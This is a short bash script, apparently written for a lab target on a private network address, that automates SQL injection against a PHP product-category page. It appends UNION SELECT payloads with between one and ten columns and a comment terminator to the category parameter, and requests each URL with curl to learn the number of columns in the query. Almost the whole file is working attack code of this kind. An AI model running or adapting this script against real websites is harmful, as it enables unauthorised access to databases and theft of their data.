#!/bin/bash
 
URL='http://192.168.1.107/cases/productsCategory.php?category=-1'

echo '**************************************'
echo $URL
echo '**************************************'

curl $URL

SQL='%20UNION%20SELECT%20'
COMMA=','
COMMENT='%20--%20 '

counter=1
URL=$URL$SQL

while [ $counter -le 10 ];
do
	if [ $counter -eq 1 ];
	then
		URL=$URL"$counter"
		URLCOMMENT=$URL$COMMENT
	else
		URL=$URL$COMMA
		URL=$URL"$counter"
		URLCOMMENT=$URL$COMMENT
	fi

	echo '**************************************'
	echo $URLCOMMENT
	echo '**************************************'

	curl $URLCOMMENT

	let counter=counter+1
done
